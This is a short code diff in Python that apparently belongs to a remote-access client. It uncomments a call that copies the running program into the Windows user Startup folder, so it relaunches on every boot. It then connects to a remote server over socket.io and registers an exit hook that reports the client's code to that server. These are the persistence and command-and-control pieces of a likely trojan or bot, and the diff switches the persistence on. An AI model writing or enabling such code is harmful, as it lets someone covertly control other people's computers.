@@ -45,7 +45,7 @@ def add_to_startup():
     copy(sys.argv[0],'C:/Users/' + getpass.getuser() + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
     
 def main():
-    # add_to_startup()
+    add_to_startup()
     sio.connect(SERVER_URL)
     # On program exit remove active client on server
     atexit.register(lambda: requests.post('{}/remove-client'.format(SERVER_URL), data={'init_code': str(initialization_code)}))
